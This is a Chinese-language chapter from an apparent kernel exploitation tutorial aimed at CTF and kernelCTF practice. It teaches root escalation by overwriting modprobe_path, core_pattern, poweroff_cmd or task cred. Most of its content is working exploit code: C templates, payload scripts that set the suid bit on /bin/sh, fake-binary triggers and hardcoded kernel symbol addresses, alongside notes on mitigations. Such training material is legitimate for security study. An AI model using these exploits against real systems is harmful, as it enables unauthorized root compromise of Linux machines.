# Ch 8 — 經典利用原語：modprobe_path / core_pattern / poweroff_cmd / cred

> 目標：學會四個不用 ROP 也能提權的經典 primitive — 任意寫就能打的 `modprobe_path`、`core_pattern`、`poweroff_cmd`，以及直接改 `task->cred` 到 `init_cred`。Part 3 heap 章節只要拿到任意寫就套這些，省掉整段 ROP。

## 為什麼要離開 ROP 的世界

ROP 前提：你控得到 RIP。很多漏洞只給你「任意寫」或「任意讀」但控不到 RIP（例如 heap overflow 到一個 data struct，不是 vtable）。

這類漏洞如果**唯一目標**是提權，你不需要 RIP — 只要能把一個關鍵 kernel data 寫成你控的值，kernel 自己會在稍後的路徑上用這個 data 跑出你要的效果。這就是 **data-only attack** 的雛形（Ch 18 深入）。

四個 primitive 的對照表：

| Primitive | 寫什麼 | Trigger | 變 root 時機 |
|---|---|---|---|
| `modprobe_path` | 字串 `/tmp/x` | execve 未知 binary format | 立刻（kernel 以 root 跑 `/tmp/x`） |
| `core_pattern` | 字串 `\|/tmp/x` | 故意 segfault | 下一次 crash 時 |
| `poweroff_cmd` | 字串 `/tmp/x` | `reboot()` syscall | 呼叫時（要 CAP_SYS_BOOT） |
| `current->cred = init_cred` | 一個 pointer | 無 | 立刻 |

## Primitive 1：`modprobe_path`（CTF 最常用）

背景：Linux 遇到**不認識的 binary format**想執行時，會呼叫 user-mode helper `modprobe` 看有沒有對應的 binfmt module。helper 路徑存在全域變數 `modprobe_path`（預設 `/sbin/modprobe`）。helper **以 root 身份**被 kernel 呼叫。

攻擊：把 `modprobe_path` 改成你控的 script，再執行一個「看起來不是 ELF」的檔案 → kernel 以 root 跑 script。

### 步驟

1. user 準備 payload：
   ```sh
   #!/bin/sh
   chmod +s /bin/sh     # 給 sh 加 suid
   ```
   `chmod +x /tmp/x`
2. 準備一個 fake binary — 隨便 4 個 byte 開頭不像 ELF magic：
   ```bash
   echo -ne '\xff\xff\xff\xff' > /tmp/fake
   chmod +x /tmp/fake
   ```
3. 透過 primitive 把 `modprobe_path` 從 `/sbin/modprobe` 改成 `/tmp/x`
4. user：`execve("/tmp/fake", ..., ...)` → kernel 找不到 binfmt → call modprobe（現在是 `/tmp/x`） → `/tmp/x` 以 root 跑 → `/bin/sh` 被加 suid
5. user：`/bin/sh -p` → root

### 找 `modprobe_path` 地址

```
/ # grep " modprobe_path$" /proc/kallsyms
ffffffff82e3d4a0 D modprobe_path
```

這個地址在 `.data` 段，受 KASLR 影響（跟 kernel text 同 slide）。

### 完整 exploit 骨架

```c
/* 假設你有一個 arbitrary_write(kaddr, kdata, len) primitive */
char *script = "#!/bin/sh\nchmod +s /bin/sh\n";
write_file("/tmp/x", script);
chmod("/tmp/x", 0755);

char fake[4] = {0xff, 0xff, 0xff, 0xff};
write_file("/tmp/fake", fake);
chmod("/tmp/fake", 0755);

char new_path[16] = "/tmp/x";
arbitrary_write(modprobe_path_addr, new_path, sizeof(new_path));

system("/tmp/fake");          /* 觸發 */
system("/bin/sh -p");         /* suid sh */
```

`/bin/sh -p` 的 `-p` 保留 effective uid（否則 bash 會主動降權）。

### 限制

- **CONFIG_STATIC_USERMODEHELPER** 開的話 `modprobe_path` 是只讀常數，這招廢。主流 distro 沒開。
- 有些 hardened kernel（Android、某些雲 VM）改成 `/bin/false` 或 sysctl `kernel.modprobe` 鎖住。

## Primitive 2：`core_pattern`

**process crash 時** kernel 把 core dump 丟給 user-mode helper。helper 路徑/命令格式存在 `core_pattern`（`/proc/sys/kernel/core_pattern`）。

當 `core_pattern` 開頭是 `|`，kernel 把 pipe 後的 command 當 helper 執行 — **以 root**。

### 攻擊步驟

1. user 準備 script `/tmp/x`：
   ```sh
   #!/bin/sh
   chmod +s /bin/sh
   ```
2. 改 `core_pattern` 為 `|/tmp/x`（注意是 pipe 符號開頭）
3. 故意觸發 segfault：
   ```c
   *(int*)0 = 0;
   ```
4. kernel 執行 `/tmp/x`（root）

### 找地址

```
/ # grep " core_pattern$" /proc/kallsyms
ffffffff82e6c840 D core_pattern
```

比 `modprobe_path` 多個 subtle：`core_pattern` 是字元陣列**大小 128 byte**，寫進去時要一次寫完整字串包含 `\0`，否則殘留內容可能破事。

### 限制

同 `modprobe_path` — 某些 hardening 會擋，但一般 LTS 都開。

## Primitive 3：`poweroff_cmd`

`reboot(LINUX_REBOOT_CMD_POWER_OFF)` syscall 前 kernel 會 exec user-mode helper（如果設了）。路徑存在 `poweroff_cmd`。

**缺點**：`reboot` syscall 需要 CAP_SYS_BOOT，unprivileged user 沒有。CTF 題裡很少用，除非你已經從別條路拿到 CAP_SYS_BOOT 想 persist。

所以實務上這個 primitive 只在**完整利用 chain 的中段**偶爾出現。知道存在即可。

## Primitive 4：直接改 `current->cred`

最乾淨的做法：不動任何 userhelper path，直接把當前 task 的 cred 換成 root 的。

### `task_struct` 與 cred

```c
struct task_struct {
    ...
    const struct cred *real_cred;
    const struct cred *cred;
    ...
};

struct cred {
    atomic_t usage;
    kuid_t  uid, gid, euid, egid, suid, sgid, fsuid, fsgid;
    ...
    kernel_cap_t cap_inheritable, cap_permitted, cap_effective, cap_bset, cap_ambient;
    ...
};
```

root 的 cred 在全域變數 `init_cred`（Ch 4 用過）。把 `current->cred = &init_cred` 就提權。

### 找 `current`

x86-64 的 `current` 透過 `gs:current_task` 拿到。task_struct 裡 cred 的 offset 依 kernel 版本浮動。6.6 下大約 `0x798`（你要自己驗）：

```
(gdb) p &((struct task_struct*)0)->cred
$1 = (const struct cred **) 0x798 <...>
```

或從 `pahole`：

```bash
pahole -C task_struct ~/kpwn/kernel/linux-6.6.60/vmlinux | grep -A1 "const struct cred \*cred"
```

### 用「任意寫」直接改

前提：知道 `current` 地址（`%gs:current_task` 讀出），或 leak 到自己的 task_struct 地址。

```c
arbitrary_write(current_addr + OFFSET_CRED, &init_cred, 8);
/* 立刻 root */
```

比 `modprobe_path` 更快（不用 trigger execve），但需要一個 leak 指向 `current`。

### 不改 cred 指標，直接改 uid 欄位

`cred` 本身是 read-only 但只要你寫 direct map 的那份 **物理 copy** 也可。做法：

```c
/* 找到 current->cred，再把那個 cred struct 的 uid field 改 0 */
void *cred = read_kernel(current_addr + OFFSET_CRED, 8);
arbitrary_write(cred + OFFSET_UID, 0, 4);  /* uid */
arbitrary_write(cred + OFFSET_GID, 0, 4);  /* gid */
/* ... euid, egid, fsuid, fsgid, suid, sgid ... 通通寫 0 */
```

實務上改 8 個 uid/gid 欄位要寫 8 次 4-byte。麻煩但更可靠（不用 leak `init_cred`）。

## 讓 `arbitrary_write` 變成上面的 exploit

假設你有個 primitive：

```c
void arbitrary_write(unsigned long kaddr, void *data, size_t len);
```

用 primitive 的 exploit 模板：

```c
int main() {
    /* 1. leak kernel base */
    unsigned long slide = leak_slide();

    /* 2. 準備 payload / fake binary */
    system("echo '#!/bin/sh\nchmod +s /bin/sh' > /tmp/x && chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake && chmod +x /tmp/fake");

    /* 3. 改 modprobe_path */
    char new_path[16] = "/tmp/x";
    arbitrary_write(MODPROBE_PATH_NOSLIDE + slide, new_path, 16);

    /* 4. trigger */
    system("/tmp/fake");

    /* 5. get shell */
    system("/bin/sh -p");
    return 0;
}
```

Part 3 heap 章節會讓你建出各種 `arbitrary_write` primitive，建好就套這段。

## 地址速查（nokaslr 下）

Ch 0 的 `env-check.sh` 加這行列出來：

```bash
nm ~/kpwn/kernel/linux-6.6.60/vmlinux | grep -E " (modprobe_path|core_pattern|poweroff_cmd|init_cred|init_task)$"
```

保存成 `symbols.h`，exploit include：

```c
#define MODPROBE_PATH  0xffffffff82e3d4a0UL
#define CORE_PATTERN   0xffffffff82e6c840UL
#define POWEROFF_CMD   0xffffffff82e3d460UL
#define INIT_CRED      0xffffffff82e3c3e0UL
#define INIT_TASK      0xffffffff82e14a40UL
```

## 對 CFI / CONFIG_STATIC_USERMODEHELPER 的抵抗力

| Primitive | CFI 影響 | STATIC_USERMODEHELPER 影響 |
|---|---|---|
| modprobe_path | 無 | **廢** |
| core_pattern | 無 | **廢** |
| poweroff_cmd | 無 | **廢** |
| cred 覆寫 | 無 | 無 |

**`cred` 覆寫是 4 個裡最耐用的** — 它不經過 function pointer、不經過 userhelper。kernelCTF 的 Mitigation 賽道特別鼓勵這類 data-only 路徑。CFI (Ch 18) 擋不了，`STATIC_USERMODEHELPER` 也擋不了。

## 常見踩雷

**`/bin/sh -p` 拿不到 root** — 你用的是 busybox sh，busybox 對 `-p` 的 handling 不同。改成直接 exec `/bin/sh`，然後在 shell 裡 `id` 看是不是 root。

**modprobe_path 改完後 `execve("/tmp/fake")` 沒反應** — 1) fake binary 不是 +x；2) 頭 4 byte 巧合是某個已知 binfmt（`#!` 是 script，`\x7fELF` 是 ELF）。用 `\xff\xff\xff\xff` 最保險。

**core_pattern 改了但沒觸發** — 某些 distro `/proc/sys/kernel/core_pattern` 被 systemd 蓋過，你 write kernel variable 沒影響觀察的 sysctl。**記住 primitive 的層次**：你是在寫 kernel memory，不是寫 sysctl virtual file。如果 kernel variable 裡有你的值，kernel 用的就是你的值。

**改 cred 但 uid 沒變** — offset 錯了。用 `pahole` 驗。

**改 cred struct 的 uid 但系統其他地方還認 uid=1000** — `euid`、`fsuid` 都要改。`current` 的 cred 不只有 uid。

## 動手練習

1. **實作 `arbitrary_write` primitive demo**：利用 Ch 5 的 stack overflow 組 ROP → `pop rsi; pop rdi; ret` + 一個 write gadget (`mov [rdi], rsi; ret`)，寫一個值到 `modprobe_path`。這是「從 RIP 控制 → 任意寫」的轉換練習。
2. **比較 4 個 primitive 觸發時間差**：modprobe_path 從「寫完 kernel variable」到「拿到 root shell」要多少 user-space 動作？cred 覆寫要幾步？排序後記住哪個最適合什麼場景。
3. **寫 `cred-offsets.py`**：用 `pahole` 抓 task_struct 裡 cred 的 offset、cred 裡 uid/gid 等 offset，輸出 header。這套 script 是 kernelCTF 各版本 submission 的標配。
4. **開 `CONFIG_STATIC_USERMODEHELPER` 重 build kernel**，驗證 modprobe_path 真的廢了（你寫進 `modprobe_path` 但 execve 失敗走不同 path）。體會 mitigation 的分量。

## 自我檢核

- [ ] 能默寫 `modprobe_path` 的完整 exploit 流程（5 步）
- [ ] 知道 `core_pattern` 開頭要加 `|`
- [ ] 能解釋「寫 kernel variable」與「寫 sysctl file」的層次差異
- [ ] 知道 task_struct 裡 cred 的 offset 怎麼查（pahole）
- [ ] 能解釋為什麼 cred 覆寫比 modprobe_path 抗 mitigation
- [ ] 看到 `CONFIG_STATIC_USERMODEHELPER` 記得 modprobe / core_pattern 路子失效

Part 2 到此結束。你已經能在 **SMEP+SMAP+canary+KASLR+KPTI 全開** 的 kernel 上從 stack overflow 拿到 root。練習 A 會整合這 5 章做一次完整攻擊鏈；然後 Part 3 走進 heap 戰場。

→ [練習 A：從 stack overflow 到 root shell](./practice-a-stack-overflow-to-root.md)
